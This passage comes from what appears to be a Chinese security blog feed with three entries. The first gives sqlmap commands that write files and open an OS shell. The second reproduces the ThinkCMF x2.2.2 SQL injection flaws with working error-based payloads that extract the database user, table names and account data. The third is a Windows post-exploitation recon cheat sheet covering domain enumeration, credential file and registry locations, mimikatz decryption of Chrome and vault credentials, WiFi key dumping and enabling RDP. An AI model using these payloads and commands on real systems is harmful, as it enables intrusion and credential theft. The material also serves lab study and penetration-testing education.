<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;   --file-write &quot;/root/1.txt&quot;</span><br><span class="line"></span><br><span class="line"> --file-dest &quot;C:/phpstudy/PHPTutorial/www/1.txt&quot;</span><br></pre></td></tr></table></figure>



<h3 id="实例演示-获取shell"><a href="#实例演示-获取shell" class="headerlink" title="实例演示-获取shell"></a>实例演示-获取shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;  --os-shell</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内功心法</category>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>-SQL注入 -工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkcmfSQL注入漏洞复现</title>
    <url>/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="ThinkCMF-x2-2-2多处SQL注入漏洞复现"><a href="#ThinkCMF-x2-2-2多处SQL注入漏洞复现" class="headerlink" title="ThinkCMF x2.2.2多处SQL注入漏洞复现"></a>ThinkCMF x2.2.2多处SQL注入漏洞复现</h1><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p>ThinkCMF是一款基于ThinkPHP+MySQL开发的中文内容管理框架，其中X系列基于ThinkPHP<br>3.2.3开发，最后更新到2.2.2版本。存在多个SQL注入漏洞</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载地址如下：<a href="https://links.jianshu.com/go?to=https://github.com/thinkcmf/cmfx/releases">https://github.com/thinkcmf/cmfx/releases</a></p>
<p><strong>工具</strong></p>
<p>火狐浏览器</p>
<p>Hacker插件</p>
<p>这里下载的是x2.2.2版本进行漏洞复现</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/bce12b0d93be364eaf36f549717488e0.png" class>



<p>在火狐浏览器上访问该thinkcms默认页面index.php(刚开始访问时需要进行安装)</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/d4928ad85b1318849c844c189449bd55.png" class>



<p>为其创建数据库thinkcmf</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/bb50a809bd8046609fff8076fa2a7217.png" class>



<p>安装ThinkCMF成功，环境搭建成功</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/3eea1de2a8aef4f9d9bb7d9680acf8a0.png" class>



<p>通过浏览器访问127.0.0.1&#x2F;thinkcmfx2.2进入前台页面，如下</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/4aea1ec411f6001c2cc08018ae1fe0cb.png" class>



<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="前台文章编辑出存在漏洞"><a href="#前台文章编辑出存在漏洞" class="headerlink" title="前台文章编辑出存在漏洞"></a>前台文章编辑出存在漏洞</h4><p>构造Payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/thinkcmfx2.2/index.php?g=portal&amp;m=article&amp;a=edit_post</span><br><span class="line"></span><br><span class="line">POST: post[id][0]=bind&amp;post[id][1]=2 and updatexml(1,</span><br><span class="line">concat(0x7e,user(),0x7e),1)-- -</span><br></pre></td></tr></table></figure>



<p>使用报错注入函数updatexml()函数报错输出用户名(也可以使用extractvalue())</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/43237512b8c2f1f11021db6ee973ebb4.png" class>



<p>修改user()为database()输出数据库名为thinkcmf</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/7eaaf40d0f426704f6ff26202d5fe8b2.png" class>

<p>得到数据库后，又得到该数据库版本大于5.0，所以可以使用information_schema这个数据库进行查询。</p>
<p>Payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/thinkcmfx2.2/index.php?g=portal&amp;m=article&amp;a=edit_pos</span><br><span class="line"></span><br><span class="line">POST: post[id][0]=bind&amp;post[id][1]=2 and extractvalue(1, concat(0x7e,(select</span><br><span class="line">table_name from information_schema.tables where table_schema=&#x27;thinkcmf&#x27; limit</span><br><span class="line">23,1 ),0x7e))-- -</span><br></pre></td></tr></table></figure>



<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/3192b554f9e7990f7e0b8f0854e9e4e4.png" class>



<p>这里本来想使用concat_group()函数输入，但是提示无效使用</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/3e9fad8a4e250e95ab38f3288d9bb591.png" class>

<p>就使用limit一个一个的输出thinkcmf数据库中的表(也可以使用暴力破解)</p>
<p>得到个cmf_users的表，继续查询该表中的账号信息，查询账户密码如下图</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/04bcaae9a7b9e47d1e651eec624ac286.png" class>



<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/a225b280efb348c7a7cb74d14de408e3.png" class>



<h4 id="后台管理"><a href="#后台管理" class="headerlink" title="后台管理"></a>后台管理</h4><p>后台管理那里，幻灯片的删除存在漏洞。（下面只进行验证，漏洞利用和上面是一样的）</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/2014b8e22db83db79ff768f9418f0071.png" class>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Payload: &lt;http://127.0.0.1/cmfx2.2/index.php?g=Admin&amp;m=slide&amp;a=delet&gt;</span><br><span class="line"></span><br><span class="line">ids[]=1&amp;ids[]=0 and updatexml(1, concat(0x7e,user(),0x7e),1)</span><br></pre></td></tr></table></figure>

<p>查询获取当前用户为root</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/fe0499d2a0a3fca2bdf56a0c800d8f1c.png" class>



<h4 id="导航编辑"><a href="#导航编辑" class="headerlink" title="导航编辑"></a>导航编辑</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Payload: &lt;http://127.0.0.1/cmfx2.2/index.php?g=Admin&amp;m=nav&amp;a=edit_post&gt;</span><br><span class="line"></span><br><span class="line">Post:  parentid=1 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br></pre></td></tr></table></figure>

<p>查询获取数据库名为thinkcmf</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/38209837e7e2a2dfa380a5bae7f14fcc.png" class>



<h4 id="评论审核页面"><a href="#评论审核页面" class="headerlink" title="评论审核页面"></a>评论审核页面</h4><img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/f7b367cb9d47e0c17e05fba0a9001a42.png" class>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">http://127.0.0.1/cmfx2.2/index.php?g=Comment&amp;m=commentadmin&amp;a=check&amp;check=1</span><br><span class="line"></span><br><span class="line">POST: ids[]=1&amp;ids[]=2 and updatexml(1,concat(0x7e,version(),0x7e),1)</span><br></pre></td></tr></table></figure>

<p>报错输出数据库版本为5.5.53</p>
<img src="/2021/10/26/ThinkcmsSQL%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0/7efcd66847ecdf9e77c0b620324df7e6.png" class>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>Web应用漏洞</category>
        <category>Thinkcmf</category>
      </categories>
      <tags>
        <tag>-web漏洞 -框架漏洞 -Thinkcmf</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows信息收集</title>
    <url>/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/</url>
    <content><![CDATA[<h1 id="Windows信息收集list"><a href="#Windows信息收集list" class="headerlink" title="Windows信息收集list"></a>Windows信息收集list</h1><h2 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h2><p>SPN即(Service Principal Names)服务器主体名称，可以理解为一个服务(如HTTP，MSSQL)等的唯一标识符，<strong>在加入域时是自动注册的</strong>，如果想使用<code>Kerberos</code>协议来认证服务，那么必须正确配置SPN。</p>
<h3 id="SPN扫描的优势"><a href="#SPN扫描的优势" class="headerlink" title="SPN扫描的优势"></a>SPN扫描的优势</h3><p>在查询SPN的时候，会向域控制器发起LDAP查询，这是正常Kerberos票据行为的一部分，所以很难被检测出来。且不需要进行大范围扫描，效率高，不需要与目标主机建立链接，可以隐蔽的同时快速发现内网中的资产以及服务。</p>
<h3 id="setspn"><a href="#setspn" class="headerlink" title="setspn"></a>setspn</h3><p>普通域用户即可查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setspn -T domain.com -Q */*</span><br></pre></td></tr></table></figure>

<img src="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210805185944585.png" class title="image-20210805185944585">

<h3 id="kerberoast工具包"><a href="#kerberoast工具包" class="headerlink" title="kerberoast工具包"></a>kerberoast工具包</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/nidem/kerberoast</span><br></pre></td></tr></table></figure>

<img src="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210805194526691.png" class title="image-20210805194526691">

<img src="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210805194541996.png" class title="image-20210805194541996">

<p>可以用于快速定位<code>域控</code>，以及排查内网中存在的<code>服务及主机</code>。</p>
<h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano -p tcp</span><br></pre></td></tr></table></figure>

<img src="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210805191040466.png" class title="image-20210805191040466">

<p>利用netstat -ano命令获取机器通信信息，根据通信的端口、ip可以获取到如下信息:</p>
<ul>
<li><p>如果通信信息是入流量，则可以获取到跳板机&#x2F;堡垒机、管理员的PC来源IP、本地web应用端口等信息</p>
</li>
<li><p>如果通信信息是出流量，则可以获取到敏感端口（redis、mysql、mssql等）、API端口等信息</p>
</li>
</ul>
<h2 id="web配置文件"><a href="#web配置文件" class="headerlink" title="web配置文件"></a>web配置文件</h2><p>一个正常的Web应用肯定有对应的数据库账号密码信息，可以使用如下命令寻找包含密码字段的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">findstr /s /m &quot;password&quot; *.*</span><br><span class="line">下面是常用应用的默认配置路径：</span><br><span class="line"></span><br><span class="line">Tomcat:</span><br><span class="line">CATALINA_HOME/conf/tomcat-users.xml</span><br><span class="line"></span><br><span class="line">Apache:</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line"></span><br><span class="line">Nginx:</span><br><span class="line">/etc/nginx/nginx.conf</span><br><span class="line"></span><br><span class="line">Wdcp:</span><br><span class="line">/www/wdlinux/wdcp/conf/mrpw.conf</span><br><span class="line"></span><br><span class="line">Mysql:</span><br><span class="line">mysql\data\mysql\user.MYD</span><br></pre></td></tr></table></figure>

<h2 id="域网络对象信息"><a href="#域网络对象信息" class="headerlink" title="域网络对象信息"></a>域网络对象信息</h2><h3 id="判断是否有域环境"><a href="#判断是否有域环境" class="headerlink" title="判断是否有域环境"></a>判断是否有域环境</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig /all 	  		 #查看网关 IP 地址、DNS 的 IP 地址、本地地址是否和 DNS 服务器为同一网段、域名</span><br><span class="line">nslookup 域名    		   #通过反向解析查询命令 nslookup 来解析域名的 IP 地址。使用解析出来的 IP 地址进行对比，判断域控制器和 DNS 服务器是否在同一台服务器上</span><br><span class="line">systeminfo        		 #域显示不为workgroup 说明有域</span><br><span class="line">net config workstation   #工作站域 DNS 名称显示域名（如果显示为 WORKGROUP，则表示非域环境）。登录域表明当前用户是域用户登录还是本地用户登录。</span><br><span class="line">net time /domain  		 #判断主域。存在域，但是当前用户不是域用户，提示拒绝访问；存在域，是域用户，提示成功完成；不存在域，提示找不到域控制器。</span><br></pre></td></tr></table></figure>

<p>&#x2F;domain的命令使用条件：当前机器是域机器，当前用户是域用户</p>
<h3 id="查询域用户"><a href="#查询域用户" class="headerlink" title="查询域用户"></a>查询域用户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user /domain</span><br><span class="line">net group &quot;domain users&quot; /domain</span><br><span class="line">net user 域用户 /domain	  		  		  获取域用户的详细信息</span><br><span class="line">net user /domain 域用户 12345678 	  		  修改域用户密码，需要域管理员权限</span><br><span class="line">net accounts /domain                         查询域用户账户等信息</span><br></pre></td></tr></table></figure>

<h3 id="查询域管理员"><a href="#查询域管理员" class="headerlink" title="查询域管理员"></a>查询域管理员</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain admins&quot; /domain</span><br></pre></td></tr></table></figure>

<h3 id="查询域控制器、定位域控制器"><a href="#查询域控制器、定位域控制器" class="headerlink" title="查询域控制器、定位域控制器"></a>查询域控制器、定位域控制器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; /domain</span><br><span class="line">net time /domain</span><br><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>

<h3 id="查看域内组"><a href="#查看域内组" class="headerlink" title="查看域内组"></a>查看域内组</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group /domain</span><br></pre></td></tr></table></figure>

<h3 id="查询域机器"><a href="#查询域机器" class="headerlink" title="查询域机器"></a>查询域机器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure>

<h3 id="共享"><a href="#共享" class="headerlink" title="共享"></a>共享</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net view 				查看同一域内机器列表</span><br><span class="line">net view \\IP			查看IP的机器共享</span><br><span class="line">net view \\TEST			查看TEST计算机的共享资源列表</span><br><span class="line">net view /domain 		查看内网存在多少个域</span><br><span class="line">net view /domain:hack	查看hack域中的机器列表</span><br></pre></td></tr></table></figure>

<h2 id="本地网络对象信息"><a href="#本地网络对象信息" class="headerlink" title="本地网络对象信息"></a>本地网络对象信息</h2><h3 id="本地用户"><a href="#本地用户" class="headerlink" title="本地用户"></a>本地用户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net localgroup administrators 							查看本机管理员组成员</span><br><span class="line">net localgroup administrators /domain 					登录本机的域管理员</span><br><span class="line">net localgroup administrators workgroup\user01 /add		域用户添加到本机管理组</span><br></pre></td></tr></table></figure>

<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><h3 id="共享-1"><a href="#共享-1" class="headerlink" title="共享"></a>共享</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>

<h3 id="Arp路由表"><a href="#Arp路由表" class="headerlink" title="Arp路由表"></a>Arp路由表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure>

<h3 id="查看hosts文件"><a href="#查看hosts文件" class="headerlink" title="查看hosts文件"></a>查看hosts文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type  c:\Windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>

<h3 id="查看DNS"><a href="#查看DNS" class="headerlink" title="查看DNS"></a>查看DNS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig /displaydns</span><br></pre></td></tr></table></figure>

<p>在WINSERVER上，使用dnscmd获取DNS记录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Dnscmd /ZonePrint hack.local</span><br></pre></td></tr></table></figure>

<img src="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210806104621284.png" class title="image-20210806104621284">

<p>非WINSERVER机器上，使用PowerView.ps1</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">import-module</span> PowerView.ps1</span><br><span class="line"><span class="built_in">Get-DNSRecord</span> <span class="literal">-ZoneName</span> hack.local</span><br></pre></td></tr></table></figure>

<img src="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210806104911527.png" class title="image-20210806104911527">

<h3 id="nbtscan、nmap"><a href="#nbtscan、nmap" class="headerlink" title="nbtscan、nmap"></a>nbtscan、nmap</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nbtscan.exe 192.168.1.4/24</span><br></pre></td></tr></table></figure>

<h3 id="icmp"><a href="#icmp" class="headerlink" title="icmp"></a>icmp</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;   #利用ICMP协议快速探测内网</span><br></pre></td></tr></table></figure>

<h3 id="arp-exe"><a href="#arp-exe" class="headerlink" title="arp.exe"></a>arp.exe</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp.exe –t 192.168.1.0/20  #arp-scan工具，需要上传arp.exe</span><br></pre></td></tr></table></figure>

<h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\windows\temp\InvokeARPScan.ps1; Invoke-ARPScan -CIDR 192.168.1.0/24&#125;&quot; &gt;&gt; C:\windows\temp\log.txt  </span><br><span class="line">#使用Nishang中的Invoke-ARPScan.ps1脚本，可以将脚本上传到目标主机执行，也可以直接远程加载执行</span><br></pre></td></tr></table></figure>

<h3 id="scanline"><a href="#scanline" class="headerlink" title="scanline"></a>scanline</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scanline -h -t 22,80- 89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O c:\windows\temp\log.txt -p 192.168.1.1-254 /b   </span><br><span class="line">#使用ScanLine对常规 TCP/UDP 端口扫描探测内网</span><br></pre></td></tr></table></figure>

<h2 id="会话信息"><a href="#会话信息" class="headerlink" title="会话信息"></a>会话信息</h2><blockquote>
<p>用于查看管理员（或某用户）登录过哪些机器，机器被哪些用户登陆过</p>
</blockquote>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PowerView  https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</span><br></pre></td></tr></table></figure>

<p>查看用户登录过哪些机器</p>
<img src="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210805230416357.png" class title="image-20210805230416357">

<p>查询机器被哪些用户登录过</p>
<img src="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210805230523704.png" alt="image-20210805230523704" style="zoom: 67%;">

<h2 id="凭据信息"><a href="#凭据信息" class="headerlink" title="凭据信息"></a>凭据信息</h2><h3 id="navicat"><a href="#navicat" class="headerlink" title="navicat"></a>navicat</h3><table>
<thead>
<tr>
<th>MySQL</th>
<th>HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers&lt;your  connection name&gt;</th>
</tr>
</thead>
<tbody><tr>
<td>MariaDB</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers&lt;your  connection name&gt;</td>
</tr>
<tr>
<td>MongoDB</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers&lt;your  connection name&gt;</td>
</tr>
<tr>
<td>Microsoft  SQL</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers&lt;your  connection name&gt;</td>
</tr>
<tr>
<td>Oracle</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers&lt;your  connection name&gt;</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers&lt;your  connection name&gt;</td>
</tr>
<tr>
<td>SQLite</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers&lt;your  connection name&gt;</td>
</tr>
</tbody></table>
<h3 id="SecureCRT"><a href="#SecureCRT" class="headerlink" title="SecureCRT"></a>SecureCRT</h3><table>
<thead>
<tr>
<th>xp&#x2F;win2003</th>
<th>C:\Documents  and Settings\USERNAME\Application Data\VanDyke\Config\Sessions</th>
</tr>
</thead>
<tbody><tr>
<td>win7&#x2F;win2008以上</td>
<td>C:\Users\USERNAME\AppData\Roaming\VanDyke\Config\Sessions</td>
</tr>
</tbody></table>
<h3 id="Xshell"><a href="#Xshell" class="headerlink" title="Xshell"></a>Xshell</h3><table>
<thead>
<tr>
<th>Xshell 5</th>
<th>%userprofile%\Documents\NetSarang\Xshell\Sessions</th>
</tr>
</thead>
<tbody><tr>
<td>Xshell 6</td>
<td>%userprofile%\Documents\NetSarang  Computer\6\Xshell\Sessions</td>
</tr>
</tbody></table>
<h3 id="WinSCP"><a href="#WinSCP" class="headerlink" title="WinSCP"></a>WinSCP</h3><table>
<thead>
<tr>
<th>HKCU\Software\Martin  Prikryl\WinSCP 2\Sessions</th>
</tr>
</thead>
</table>
<h3 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h3><table>
<thead>
<tr>
<th>RealVNC</th>
<th>HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver</th>
<th>Password</th>
</tr>
</thead>
<tbody><tr>
<td>TightVNC</td>
<td>HKEY_CURRENT_USER\Software\TightVNC\Server  Value</td>
<td>Password  or PasswordViewOnly</td>
</tr>
<tr>
<td>TigerVNC</td>
<td>HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4</td>
<td>Password</td>
</tr>
<tr>
<td>UltraVNC</td>
<td>C:\Program  Files\UltraVNC\ultravnc.ini</td>
<td>passwd or  passwd2</td>
</tr>
</tbody></table>
<h3 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmdkey/list</span><br></pre></td></tr></table></figure>

<h2 id="DPAPI"><a href="#DPAPI" class="headerlink" title="DPAPI"></a>DPAPI</h2><h3 id="解密Chrome密码："><a href="#解密Chrome密码：" class="headerlink" title="解密Chrome密码："></a>解密Chrome密码：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz dpapi::chrome /in:&quot;%localappdata%\Google\Chrome\User Data\Default\Login  Data&quot; /unprotect</span><br></pre></td></tr></table></figure>

<h3 id="解密Credential："><a href="#解密Credential：" class="headerlink" title="解密Credential："></a>解密Credential：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz vault::cred /patch</span><br></pre></td></tr></table></figure>

<h2 id="域信任"><a href="#域信任" class="headerlink" title="域信任"></a>域信任</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nltest /domain_trusts</span><br></pre></td></tr></table></figure>

<h2 id="域传送"><a href="#域传送" class="headerlink" title="域传送"></a>域传送</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup  -type=ns domain.comnslookupsserver  dns.domain.comls  domain.com</span><br></pre></td></tr></table></figure>

<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dig  @dns.domain.com axfr domain.com</span><br></pre></td></tr></table></figure>

<h2 id="WIFI"><a href="#WIFI" class="headerlink" title="WIFI"></a>WIFI</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#x27;netsh wlan show profiles&#x27;)  do  @echo %j | findstr -i -v echo |  netsh wlan show profiles %j key=clear</span><br></pre></td></tr></table></figure>

<h2 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h2><p>学习提权的时候再做了解</p>
<h2 id="其他基础信息收集"><a href="#其他基础信息收集" class="headerlink" title="其他基础信息收集"></a>其他基础信息收集</h2><h3 id="获取当前shell权限"><a href="#获取当前shell权限" class="headerlink" title="获取当前shell权限"></a>获取当前shell权限</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami /user &amp;&amp; whoami /priv</span><br></pre></td></tr></table></figure>

<p>别看到普通权限就提权，实在没法深入再提权。</p>
<p>提权可能打崩服务器，或者不免杀触发警报。</p>
<img src="/2021/10/20/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210806105745713.png" alt="image-20210806105745713" style="zoom: 67%;">

<h3 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h3><p>主要关注修补程序</p>
<h3 id="机器名"><a href="#机器名" class="headerlink" title="机器名"></a>机器名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure>

<h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic OS get Caption,CSDVersion,OSArchitecture,Version</span><br></pre></td></tr></table></figure>

<h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ver</span><br></pre></td></tr></table></figure>

<h3 id="查看杀软"><a href="#查看杀软" class="headerlink" title="查看杀软"></a>查看杀软</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</span><br></pre></td></tr></table></figure>

<h3 id="查看当前安装程序"><a href="#查看当前安装程序" class="headerlink" title="查看当前安装程序"></a>查看当前安装程序</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure>

<h3 id="查看在线用户"><a href="#查看在线用户" class="headerlink" title="查看在线用户"></a>查看在线用户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">quser</span><br></pre></td></tr></table></figure>

<h3 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /v    #/v可以查看是谁开启的进程</span><br></pre></td></tr></table></figure>

<h3 id="查看当前登录域"><a href="#查看当前登录域" class="headerlink" title="查看当前登录域"></a>查看当前登录域</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure>

<h3 id="查询并开启RDP"><a href="#查询并开启RDP" class="headerlink" title="查询并开启RDP"></a>查询并开启RDP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber    #查看远程连接端口</span><br><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1    #在 Windows Server 2003 中开启 3389 端口</span><br><span class="line"></span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1  </span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>

<h3 id="查看RDP连接历史"><a href="#查看RDP连接历史" class="headerlink" title="查看RDP连接历史"></a>查看RDP连接历史</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmdkey /l</span><br></pre></td></tr></table></figure>

